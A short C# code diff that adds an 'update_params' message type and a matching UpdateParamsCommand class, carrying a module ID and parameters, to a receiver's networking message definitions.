@@ -6,6 +6,7 @@ namespace Receiver.Core.Networking;
 public static class MessageTypes
 {
     public const string Execute = "execute";
+    public const string UpdateParams = "update_params";
     public const string Kill = "kill";
     public const string Nuke = "nuke";
     public const string CheckUpdate = "check_update";
@@ -36,6 +37,20 @@ public class ExecuteCommand : BaseMessage
     public ExecuteCommand()
     {
         Type = MessageTypes.Execute;
+    }
+}
+
+public class UpdateParamsCommand : BaseMessage
+{
+    [JsonPropertyName("module_id")]
+    public string ModuleId { get; set; } = string.Empty;
+
+    [JsonPropertyName("parameters")]
+    public Dictionary<string, object>? Parameters { get; set; }
+
+    public UpdateParamsCommand()
+    {
+        Type = MessageTypes.UpdateParams;
     }
 }
 
